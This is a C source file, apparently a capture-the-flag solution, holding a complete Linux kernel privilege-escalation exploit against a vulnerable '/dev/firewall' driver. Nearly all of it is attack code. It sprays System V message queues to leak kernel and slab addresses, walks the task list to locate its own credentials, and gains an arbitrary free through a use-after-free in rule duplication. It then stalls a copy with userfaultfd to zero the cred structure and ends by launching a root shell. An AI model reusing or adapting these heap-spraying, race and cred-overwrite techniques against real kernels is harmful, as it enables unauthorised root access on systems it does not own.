#define _GNU_SOURCE
#include <inttypes.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <sched.h>
#include <pthread.h>
#include <byteswap.h>
#include <poll.h>
#include <assert.h>
#include <time.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/timerfd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/reboot.h>
#include <sys/types.h>
#include <linux/userfaultfd.h>
#include <arpa/inet.h>
#include <sys/shm.h>
#include <sys/stat.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <errno.h>

#define ADD_RULE 0x1337babe
#define DELETE_RULE 0xdeadbabe
#define EDIT_RULE 0x1337beef
#define SHOW_RULE 0xdeadbeef
#define DUP_RULE 0xbaad5aad

#define ERROR -1
#define SUCCESS 0
#define MAX_RULES 0x80

#define INVALIDATE 1
#define VALIDATE 0

#define OFFSET_NAME 0x550
#define OFFSET_TASK 0x2a0
#define OFFSET_CRED 0x540

#define INBOUND 0
#define OUTBOUND 1
#define SKIP -1

typedef struct
{
    char iface[16];
    char name[16];
    char ip[16];
    char netmask[16];
    uint8_t idx;
    uint8_t type;
    uint16_t proto;
    uint16_t port;
    uint8_t action;
} user_rule_t;

int fd = 0, qid = 0, qid2 = 0, qid3 = 0, ret;
static int page_size = 0x1000;
unsigned long arb_free_addr = 0;
unsigned long kernel_leak = 0, cred = 0, init_task = 0;
unsigned long leak_msq_queue, leak_0x1000, leak_0xc0;
unsigned long addr, condition = 0;
unsigned long j = 0, i = 0, k;
unsigned long num[0x100] = {0};
unsigned long * ptr;
char buf[0x2000];
pthread_t thr;

void *register_userfaultfd(unsigned long, int, void *);
void racer(void *);

void hexprint(char *buffer, unsigned int bytes) // print like gdb qwords, we round to nearest dqword
{
    int dqwords = ((bytes + 0x10 - 1)&0xfffffff0) / 0x10;
    int qwords = dqwords * 2;
    for (int i = 0; i < qwords; i+=2)
    {
        if(i%24 == 0)	printf("\n");
        printf("0x%04llx: 0x%016llx 0x%016llx\n", (i * 0x8), ((size_t*)buffer)[i], ((size_t*)buffer)[i+1]);
    }
    puts("-----------------------------------------------");
    return;
}

void gen_dot_notation(char *buf, uint32_t val)
{
    sprintf(buf, "%d.%d.%d.%d", val & 0xff, (val & 0xff00) >> 8, (val & 0xff0000) >> 16, (val & 0xff000000) >> 24);
    return;
}

void generate(char *input, user_rule_t *req)
{
    char addr[0x10];
    uint32_t ip = *(uint32_t *)&input[0x20];        // remain improved
    uint32_t netmask = *(int32_t *)&input[0x24];

    memset(addr, 0, sizeof(addr));
    gen_dot_notation(addr, ip);
    memcpy((void *)req->ip, addr, 0x10);

    memset(addr, 0, sizeof(addr));
    gen_dot_notation(addr, netmask);
    memcpy((void *)req->netmask, addr, 0x10);

    memcpy((void*)req->iface, input, 0x10);
    memcpy((void*)req->name,  (void *)&input[0x10], 0x10);
    memcpy((void*)&req->proto, (void *)&input[0x28], 0x2);
    memcpy((void*)&req->port,  (void *)&input[0x28+2], 0x2);
    memcpy((void*)&req->action,(void *)&input[0x28+4], 0x1);
}

void add(uint8_t idx, char *buffer, int type)
{
    user_rule_t rule;
    memset((void *)&rule, 0, sizeof(user_rule_t));
    generate(buffer, &rule);
    rule.idx = idx;
    rule.type = type;
    ioctl(fd, ADD_RULE, &rule);
}

void delete(uint8_t idx, int type)
{
    user_rule_t rule;
    memset((void *)&rule, 0, sizeof(user_rule_t));
    rule.idx = idx;
    rule.type = type;
    ioctl(fd, DELETE_RULE, &rule);
}

void edit(uint8_t idx, char *buffer, int type, int invalidate)
{
    user_rule_t rule;
    memset((void *)&rule, 0, sizeof(user_rule_t));
    generate(buffer, &rule);
    rule.idx = idx;
    rule.type = type;
    if (invalidate)
    {
        strcpy((void *)&rule.ip, "invalid");
        strcpy((void *)&rule.netmask, "invalid");
    }
    ioctl(fd, EDIT_RULE, &rule);
}

void duplicate(uint8_t idx, int type)
{
    user_rule_t rule;
    memset((void *)&rule, 0, sizeof(user_rule_t));
    rule.idx = idx;
    rule.type = type;
    ioctl(fd, DUP_RULE, &rule);
}

void errExit(char* msg1)
{
  puts(msg1);
  exit(-1);
}

void bp(char *p)
{
	char a;
	printf("Breakpoint: %s\n", p);
	read(0, &a, 1);
	return;
}

unsigned long check_task(unsigned long addr)
{
	memset(buf, 0x61, 0x10);
	memset(buf + 0x10, 0x42, 8);
	*(unsigned long *)(buf + 0x18) = 0x1000 - 0x30 + 0x1000 - 0x10;
	*(unsigned long *)(buf + 0x20) = addr - 8;
	edit(0, buf, INBOUND, VALIDATE);

	memset(buf, 0, 0x2000);
	ret = msgrcv(qid, buf, 0x1000 - 0x30 + 0x1000 - 0x10, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
	assert(ret > 0);

	char * curr_name = buf + 0x1000 - 0x28 + OFFSET_NAME;
	printf("current_task 0x%lx, name: %s\n", addr, curr_name);

	if (!strcmp("speedrunner", curr_name))
		return 1;
	return 0;
}

static void * fault_handler_thread1(void *arg)
{
   struct uffd_msg msg;   /* Data read from userfaultfd */
   static int fault_cnt = 0;     /* Number of faults so far handled */
   long uffd;                    /* userfaultfd file descriptor */
   static char *page = NULL;
   struct uffdio_copy uffdio_copy;
   ssize_t nread;

   uffd = (long) arg;

   /* Create a page that will be copied into the faulting region. */
   if (page == NULL) {
       page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
       if (page == MAP_FAILED)
           errExit("mmap");
   }

   /* Loop, handling incoming events on the userfaultfd
      file descriptor. */
   for (;;) {

       /* See what poll() tells us about the userfaultfd. */
       struct pollfd pollfd;
       int nready;
       pollfd.fd = uffd;
       pollfd.events = POLLIN;
       nready = poll(&pollfd, 1, -1);
       if (nready == -1)
           errExit("poll");

       // printf("\nfault_handler_thread():\n");
       // printf("    poll() returns: nready = %d; "
       //         "POLLIN = %d; POLLERR = %d\n", nready,
       //         (pollfd.revents & POLLIN) != 0,
       //         (pollfd.revents & POLLERR) != 0);

       /* Read an event from the userfaultfd. */
       nread = read(uffd, &msg, sizeof(msg));
       if (nread == 0) {
           printf("EOF on userfaultfd!\n");
           exit(EXIT_FAILURE);
       }

       if (nread == -1)		errExit("read");

       /* We expect only one kind of event; verify that assumption. */
       if (msg.event != UFFD_EVENT_PAGEFAULT) {
           fprintf(stderr, "Unexpected event on userfaultfd\n");
           exit(EXIT_FAILURE);
       }

       /* Display info about the page-fault event. */
       // printf("    UFFD_EVENT_PAGEFAULT event: ");
       // printf("flags = %"PRIx64"; ", msg.arg.pagefault.flags);
       // printf("address = %"PRIx64"\n", msg.arg.pagefault.address);
       
       // Do the thing...
       	puts("Sleeping for 4 sec...");
        sleep(4);
        puts("Wait over... overwritting cred :)");
		memset(page, 0x00, 0x1000);

       uffdio_copy.src = (unsigned long) page;

       /* We need to handle page faults in units of pages(!).
          So, round faulting address down to page boundary. */
       uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                          ~(page_size - 1);
       uffdio_copy.len = page_size;
       uffdio_copy.mode = 0;
       uffdio_copy.copy = 0;
       if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
           errExit("ioctl-UFFDIO_COPY");

       // printf("        (uffdio_copy.copy returned %"PRId64")\n",
       //         uffdio_copy.copy);
       // sleep(100000);
   }
}

static void * fault_handler_thread(void *arg)
{
   struct uffd_msg msg;   /* Data read from userfaultfd */
   static int fault_cnt = 0;     /* Number of faults so far handled */
   long uffd;                    /* userfaultfd file descriptor */
   static char *page = NULL;
   struct uffdio_copy uffdio_copy;
   ssize_t nread;

   uffd = (long) arg;

   /* Create a page that will be copied into the faulting region. */
   if (page == NULL) {
       page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
       if (page == MAP_FAILED)
           errExit("mmap");
   }

   /* Loop, handling incoming events on the userfaultfd
      file descriptor. */
   for (;;) {

       /* See what poll() tells us about the userfaultfd. */
       struct pollfd pollfd;
       int nready;
       pollfd.fd = uffd;
       pollfd.events = POLLIN;
       nready = poll(&pollfd, 1, -1);
       if (nready == -1)
           errExit("poll");

       // printf("\nfault_handler_thread():\n");
       // printf("    poll() returns: nready = %d; "
       //         "POLLIN = %d; POLLERR = %d\n", nready,
       //         (pollfd.revents & POLLIN) != 0,
       //         (pollfd.revents & POLLERR) != 0);

       /* Read an event from the userfaultfd. */
       nread = read(uffd, &msg, sizeof(msg));
       if (nread == 0) {
           printf("EOF on userfaultfd!\n");
           exit(EXIT_FAILURE);
       }

       if (nread == -1)		errExit("read");

       /* We expect only one kind of event; verify that assumption. */
       if (msg.event != UFFD_EVENT_PAGEFAULT) {
           fprintf(stderr, "Unexpected event on userfaultfd\n");
           exit(EXIT_FAILURE);
       }

       /* Display info about the page-fault event. */
       // printf("    UFFD_EVENT_PAGEFAULT event: ");
       // printf("flags = %"PRIx64"; ", msg.arg.pagefault.flags);
       // printf("address = %"PRIx64"\n", msg.arg.pagefault.address);
       
       // Do the thing...
       if (condition == 0)
       {
		   memset(page, 0x00, 0x1000);
		   *(unsigned long *)((char *)page + 0xfd0) = 0;
		   *(unsigned long *)((char *)page + 0xfd8) = 0x61616161;
		   *(unsigned long *)((char *)page + 0xfe0) = 0xfd0+0x30;
		   *(unsigned long *)((char *)page + 0xfe8) = cred - 0x8;
		   puts("Condition 0 active.");

	       arb_free(arb_free_addr);

	       // bp("Sanity check 0x1000...1");
	       pthread_t pt_temp;
	       pthread_create(&pt_temp, NULL, racer, (void *)NULL);

		   puts("Racer thread created...");
		   sleep(1);
	       // bp("Sanity check 0x1000...2");
	       condition = 1;
		}
		else
		{
	        // bp("Just overwrote first 0x1000 bytes... Sanity check?");
			memset(page, 0x00, 0x1000);
		}

       uffdio_copy.src = (unsigned long) page;

       /* We need to handle page faults in units of pages(!).
          So, round faulting address down to page boundary. */
       uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                          ~(page_size - 1);
       uffdio_copy.len = page_size;
       uffdio_copy.mode = 0;
       uffdio_copy.copy = 0;
       if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
           errExit("ioctl-UFFDIO_COPY");

       // printf("        (uffdio_copy.copy returned %"PRId64")\n",
       //         uffdio_copy.copy);
       // sleep(100000);
   }
}

void * register_userfaultfd(unsigned long prefer, int n_pages, void * fault_handler_thread)
{
	long uffd;          /* userfaultfd file descriptor */
	char *addr;         /* Start of region handled by userfaultfd */
	uint64_t len;       /* Length of region handled by userfaultfd */
	struct uffdio_api uffdio_api;
	struct uffdio_register uffdio_register;
	int s;

	len = page_size;

	/* Create and enable userfaultfd object. */
	uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
	if (uffd == -1)
	   errExit("userfaultfd");

	uffdio_api.api = UFFD_API;
	uffdio_api.features = 0;
	if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
	   errExit("ioctl-UFFDIO_API");

	/* Create a private anonymous mapping. The memory will be
	  demand-zero paged--that is, not yet allocated. When we
	  actually touch the memory, it will be allocated via
	  the userfaultfd. */
	void *bla;
	if (prefer)		bla = (void *)prefer;
	else bla = NULL;
	addr = mmap(bla, n_pages*len, PROT_READ | PROT_WRITE,
	           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (addr == MAP_FAILED)
	   errExit("mmap");

	printf("Address returned by mmap() = %p\n", addr);

	/* Register the memory range of the mapping we just created for
	  handling by the userfaultfd object. In mode, we request to track
	  missing pages (i.e., pages that have not yet been faulted in). */
	uffdio_register.range.start = (unsigned long) addr+0x1000;
	uffdio_register.range.len = 2*len;
	uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
	if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
	   errExit("ioctl-UFFDIO_REGISTER");

	/* Create a thread that will process the userfaultfd events. */
	s = pthread_create(&thr, NULL, fault_handler_thread, (void *) uffd);
	if (s != 0) {
	   errno = s;
	   errExit("pthread_create");
	}

	return addr;
}

void arb_free(unsigned long address)
{
	delete(0, OUTBOUND);
	assert(msgsnd(qid2, buf, 0x8, IPC_NOWAIT) != -1);
	
	*(unsigned long *)(buf + 0x00) = leak_msq_queue;
	*(unsigned long *)(buf + 0x08) = leak_msq_queue;
	*(unsigned long *)(buf + 0x10) = 0x4040404040404040;
	*(unsigned long *)(buf + 0x18) = 0x8;
	*(unsigned long *)(buf + 0x20) = address;
	edit(1, buf, INBOUND, VALIDATE);

	printf("Going for arb_free: 0x%lx\n", address);
	// bp("bp inside arb_free...");
	assert(msgrcv(qid2, buf, 0xf80, 0, IPC_NOWAIT | MSG_NOERROR) > 0);
}

void racer(void * arg)
{
	puts("Racer is up...");
	char * addr2 = register_userfaultfd(0, 3, fault_handler_thread1);
	int qid4 = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
	printf("qid4: %d\n", qid3);
	memset(addr2+0x1000-0x100, 0x69, 0x80);
	assert(msgsnd(qid4 , addr2+0x1000-0x100, 0xfd0+0x30, IPC_NOWAIT) != -1);
}

int main()
{
	// system("cat /symbols | grep firewall | tail -n 2");

	fd = open("/dev/firewall", O_RDONLY);
	if (fd <= 0)	exit(puts("ERROR in open()"));

	qid = msgget(IPC_PRIVATE, IPC_CREAT | 0666);

	memset(buf, 0x41, 0x1000);
	add(0, buf, INBOUND);
	duplicate(0, INBOUND);
	delete(0, OUTBOUND);

	memset(num, 0, 0x100*8);
	memset(buf, 0x42, 0x1000);
	assert(msgsnd(qid , buf, 0x8, IPC_NOWAIT) != -1);

	memset(buf, 0x61, 0x10);
	memset(buf + 0x10, 0x42, 8);
	*(unsigned long *)(buf + 0x18) = 0x1000 - 0x30;
	edit(0, buf, INBOUND, INVALIDATE);

	for (i=0; i<0x80; i++)
	{
		qid2 = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
		memset(buf, 0x66, 0x8);
		assert(msgsnd(qid2, buf, 0x8, IPC_NOWAIT) != -1);
		memset(buf, 0, 0x2000);
		assert(msgrcv(qid, buf, 0x1000-0x30, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR) > 0);
		for(ptr=buf; ptr<buf+0x1000-0x30; ptr++)
		{
			if (*ptr == 0x6666666666666666)
			{
				// printf("Found!!! chunk offset: 0x%lx\n", (unsigned long)ptr - (unsigned long)buf);
				num[0] = ptr[-2];
				num[1] = ptr[-1];
				break;
			}
		}
		if(num[0])	break;
	}
	memset(buf, 0x65, 0x8);
	assert(msgsnd(qid2, buf, 0xfd0 + 0xff0, IPC_NOWAIT) != -1);
	memset(buf, 0, 0x2000);
	assert(msgrcv(qid, buf, 0x1000-0x30, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR) > 0);
	leak_0x1000 = ptr[-2];
	leak_msq_queue = ptr[-1];
	printf("SLAB-0x1000 LEAK: 0x%lx\n", leak_0x1000);
	printf("leak_msg_queue: 0x%lx\n", leak_msq_queue);

	for (i=0; i<0x1000; i+=8)
	{
		if ((*(unsigned long *)(buf + i) & 0xffff) == 0x59a0)
		{
			kernel_leak = *(unsigned long *)(buf + i);
			break;
		}
	}
	assert(kernel_leak != 0);

	init_task = kernel_leak - 0xffffffffba2159a0 + 0xffffffffba4124c0;
	printf("kernel_leak: 0x%lx\n", kernel_leak);
	printf("init_task: 0x%lx\n", init_task);
	// system("cat /symbols | grep sysfs_bin_kfops_ro");
	// system("cat /symbols | grep init_task | tail -n 1");
	// system("cat /symbols | grep free_msg");
	// system("cat /symbols | grep alloc_msg");
	// system("cat /symbols | grep load_msg");
	// system("cat /symbols | grep \"T _copy_from_user\"");
	// system("cat /symbols | grep kfree | grep -v _");
	// system("cat /symbols | grep \" prepare_creds\"");
	// system("cat /symbols | grep \" kmem_cache_alloc_node\"");

	prctl(PR_SET_NAME, "speedrunner");

	unsigned long curr_task = init_task;

	for(int i=0; i<0x40; i++)
	{
		ret = check_task(curr_task);
		if (ret)
		{
			cred = *(unsigned long *)(buf + 0x1000 - 0x28 + OFFSET_CRED);
			break;
		}
		curr_task = *(unsigned long *)(buf + 0x1000 - 0x28 + OFFSET_TASK) - OFFSET_TASK + 8;
	}
	printf("cred: 0x%lx\n", cred);

	arb_free_addr = leak_0x1000;
	printf("arb_free_addr: 0x%lx\n", arb_free_addr);

	memset(buf, 0x41, 0x1000);
	add(1, buf, INBOUND);
	duplicate(1, INBOUND);

	assert(msgrcv(qid2, buf, 0xfd0 + 0xff0, 0, IPC_NOWAIT | MSG_NOERROR) > 0);
	assert(msgrcv(qid2, buf, 0x8  , 0, IPC_NOWAIT | MSG_NOERROR) > 0);

	addr = register_userfaultfd(0, 3, fault_handler_thread);

	qid3 = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
	printf("qid3: %d\n", qid3);
	memset(addr+0x1000-8, 0x42, 8);
	assert(msgsnd(qid3 , addr+0x1000-8, 0xfd0+0xff0, IPC_NOWAIT) != -1);

	sleep(5);
	puts("Enjoy root :)");
	system("/bin/sh");
	_exit(0);
	return 0;
}
